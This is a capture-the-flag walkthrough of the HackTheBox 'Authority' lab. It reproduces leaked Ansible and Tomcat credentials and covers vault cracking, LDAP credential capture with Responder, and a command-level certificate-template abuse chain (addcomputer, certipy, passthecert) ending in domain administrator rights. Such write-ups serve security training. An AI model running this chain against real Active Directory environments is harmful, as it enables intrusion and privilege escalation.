# main.yml - default dir

```bash
# A passphrase for the CA key.
ca_passphrase: SuP3rS3creT

# The common name for the CA.
ca_common_name: authority.htb

# Other details for the CA.
ca_country_name: NL
ca_email_address: admin@authority.htb
ca_organization_name: htb
ca_organizational_unit_name: htb
ca_state_or_province_name: Utrecht
ca_locality_name: Utrecht
```



# main.yml - meta dir

```bash
galaxy_info:
  author: robertdebock
  role_name: ca
  description: Install and configure a certificate authority on your system.
  license: Apache-2.0
  company: none
  min_ansible_version: "2.10"

  platforms:
    - name: EL
      versions:
        - "8"
    - name: Debian
      versions:
        - all
    - name: Fedora
      versions:
        - all
    - name: opensuse
      versions:
        - all
    - name: Ubuntu
      versions:
        - all

  galaxy_tags:
    - ca
    - certificate
    - authority
    - openssl

dependencies: []
```
# pwm - ansible_inventory

```bash
ansible_user: administrator
ansible_password: Welcome1
ansible_port: 5985
ansible_connection: winrm
ansible_winrm_transport: ntlm
ansible_winrm_server_cert_validation: ignore 
```
# pwm - defaults/main.yml

```bash
---
pwm_run_dir: "{{ lookup('env', 'PWD') }}"

pwm_hostname: authority.htb.corp
pwm_http_port: "{{ http_port }}"
pwm_https_port: "{{ https_port }}"
pwm_https_enable: true

pwm_require_ssl: false

pwm_admin_login: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          32666534386435366537653136663731633138616264323230383566333966346662313161326239
          6134353663663462373265633832356663356239383039640a346431373431666433343434366139
          35653634376333666234613466396534343030656165396464323564373334616262613439343033
          6334326263326364380a653034313733326639323433626130343834663538326439636232306531
          3438

pwm_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          31356338343963323063373435363261323563393235633365356134616261666433393263373736
          3335616263326464633832376261306131303337653964350a363663623132353136346631396662
          38656432323830393339336231373637303535613636646561653637386634613862316638353530
          3930356637306461350a316466663037303037653761323565343338653934646533663365363035
          6531

ldap_uri: ldap://127.0.0.1/
ldap_base_dn: "DC=authority,DC=htb"
ldap_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          63303831303534303266356462373731393561313363313038376166336536666232626461653630
          3437333035366235613437373733316635313530326639330a643034623530623439616136363563
          34646237336164356438383034623462323531316333623135383134656263663266653938333334
          3238343230333633350a646664396565633037333431626163306531336336326665316430613566
          3764
```

# pwm - templates/tomcatusers

```bash
<?xml version='1.0' encoding='cp1252'?>

<tomcat-users xmlns="http://tomcat.apache.org/xml" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
 xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
 version="1.0">

<user username="admin" password="T0mc@tAdm1n" roles="manager-gui"/>  
<user username="robot" password="T0mc@tR00t" roles="manager-script"/>

</tomcat-users>
```
# Metasploit rpc auditor

```bash
msf6 auxiliary(scanner/dcerpc/tcp_dcerpc_auditor) > run

10.129.237.245 - UUID 99fcfec4-5260-101b-bbcb-00aa0021347a 0.0 OPEN VIA 135 ACCESS GRANTED 00000000000000000000000000000000000000000000000076070000
10.129.237.245 - UUID afa8bd80-7d8a-11c9-bef4-08002b102989 1.0 OPEN VIA 135 ACCESS GRANTED 000002000d0000000d00000004000200080002000c0002001000020014000200180002001c0002002000020024000200280002002c00020030000200340002000883afe11f5dc91191a408002b14a0fa0300000084650a0b0f9ecf11a3cf00805f68cb1b0100010026b5551d37c1c546ab79638f2a68e869010000007f0bfe64f59e5345a7db9a197577755401000000e6730ce6f988cf119af10020af6e72f402000000c4fefc9960521b10bbcb00aa0021347a00000000609ee7b9523dce11aaa100006901293f000002001e242f412ac1ce11abff0020af6e7a17000002003601000000000000c0000000000000460000000072eef3c67eced111b71e00c04fc3111a01000000b84a9f4d1c7dcf11861e0020af6e7c5700000000a001000000000000c0000000000000460000000079a140cbe120f04397fb3c5c6ff37ec30000000000000000
[*] 10.129.237.245:135    - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```


X-Pwm-Amb: in the future, you'll just /think/ your password


```bash
gene@th0nkpad-1:~/ctf-challenges/hackthebox/medium/authority$ dig +noall +answer @10.129.237.228 authority.htb 
authority.htb.          600     IN      A       10.129.237.228
                                                                                                                                                                       
gene@th0nkpad-1:~/ctf-challenges/hackthebox/medium/authority$ dig +noall +answer @10.129.237.228 authority.htb.corp
authority.htb.corp.     1200    IN      A       10.129.237.228


Name Servers:
______________

authority.authority.htb.                 3600     IN    A        10.129.237.228

```


# Decrypt ansible vault

Use ansible2john on one of the hashes, the password is: !@#$%^&*  - Using this with the online decrypter, we are able to decrypt the hashes from the main.yml file.

1. svc_pwm
2. pWm_@dm!N_!23
3. DevT3st@123

Number 2 is used as the password for the 'Configuration Manager on https://authority.htb:8443/pwm/private/config/manager'

# Responder creds

```bash
[+] Listening for events...                                                                                                                                            

[LDAP] Cleartext Client   : 10.129.249.104
[LDAP] Cleartext Username : CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb
[LDAP] Cleartext Password : lDaP_1n_th3_cle4r!
```
You can use the above creds: svc_ldap:lDaP_1n_th3_cle4r! with evil-winrm to login!

# Escalation to root

Theres a Cert folder in C:\ (this is a clue on what to do)

```bash
impacket-addcomputer authority.htb/svc_ldap:'lDaP_1n_th3_cle4r!' -computer-name WOT$ -computer-pass Password123
```
This adds an account.

```bash
python3 certipy req -u 'WOT$' -p 'Password123' -ca AUTHORITY-CA -target authority.htb -template CorpVPN -upn administrator@authority.htb -dns authority.authority.htb -dc-ip 10.129.249.104
```
```bash
certipy cert -pfx administrator_authority.pfx -nokey -out user.crt
```
```bash
python3 certipy cert -pfx administrator_authority.pfx -nocert -out user.key
```
```bash
python3 passthecert.py -action ldap-shell -crt ~/.local/bin/user.crt -key ~/.local/bin/user.key -domain authority.htb -dc-ip 10.129.249.104
```
This opens an LDAP 'shell' when the shell is open type:

```bash
add_user_to_group svc_ldap Administrators
```

After this, restart your Evil-WinRM session and you are now a local admin. GG

